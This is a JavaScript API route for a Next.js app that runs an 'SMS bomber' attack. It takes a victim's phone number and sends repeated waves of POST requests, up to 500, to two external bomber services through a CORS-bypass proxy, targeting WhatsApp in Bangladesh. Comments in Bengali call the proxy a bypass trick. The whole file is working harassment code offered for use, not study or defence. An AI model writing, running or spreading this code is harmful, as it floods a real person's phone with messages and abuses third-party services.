// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const { number, amount, isUltimate } = req.body;

  // Target links
  const targetLinks = [
    'https://shadowx-sms-bomber.onrender.com/',
    'https://nuke-sms-bomber.pages.dev/'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 500 : amount; 
    const delay = isUltimate ? 500 : 2000; 

    for (let i = 0; i < totalWaves; i++) {
      // Amra ekhane ekta Proxy URL use korbo jeta CORS bypass korbe
      // Eita ekta trick jeta request ke bypass korbe
      const proxyUrl = "https://cors-anywhere.herokuapp.com/";

      const attackRequests = targetLinks.map(link => 
        fetch(proxyUrl + link, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
          },
          body: JSON.stringify({
            number: number,
            amount: amount,
            country: "BD",
            service: "whatsapp",
            msg: "Ultimate Bomber Attack"
          }),
        }).catch(err => console.log("Wave Error:", err.message))
      );

      await Promise.all(attackRequests);

      // Delay logic
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  // Attack start
  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK STARTED! 🔥" 
  });
}
